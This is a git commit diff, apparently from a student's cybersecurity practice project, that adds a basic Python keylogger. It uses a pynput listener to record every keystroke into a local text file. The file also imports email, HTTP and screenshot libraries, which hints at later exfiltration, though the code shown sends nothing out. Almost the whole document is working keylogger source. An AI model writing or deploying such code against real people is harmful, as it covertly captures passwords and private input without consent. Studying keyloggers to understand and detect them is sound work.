6f809a0e4cee7af4c69e9a3456155f75fcff5da6
RachitTanwar <tanwarrachit6@gmail.com>
2024-06-28 18:37:05 +0530

    Basic Keylogger Done

--- project/keylogger.py
+++ project/keylogger.py
@@ -1,4 +1,4 @@
-# Libraries
+ # Libraries
 
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
@@ -26,3 +26,40 @@ from requests import get
 
 from multiprocessing import freeze_support, Process
 from PIL import ImageGrab
+
+key_information = "key_log.txt"
+file_path = "/Users/rachittanwar/Documents/[02]/Coding/Cybersecurity/Python Keylogger/project"
+extend = "/"
+
+count = 0
+keys = []
+
+def on_press(key):
+    global keys, count
+
+    print(key)
+    keys.append(key)
+    count += 1
+
+    if count >= 1:
+        count = 0
+        write_file(keys)
+        keys = []
+
+def write_file(keys):
+    with open(file_path + extend + key_information, "a") as f:
+        for key in keys:
+            k = str(key).replace("'", "")
+            if k.find("space") > 0:
+                f.write('\n')
+                f.close()
+            elif k.find("Key") == -1:
+                f.write(k)
+                f.close()
+
+def on_release(key):
+    if key == Key.esc:
+        return False
+    
+with Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
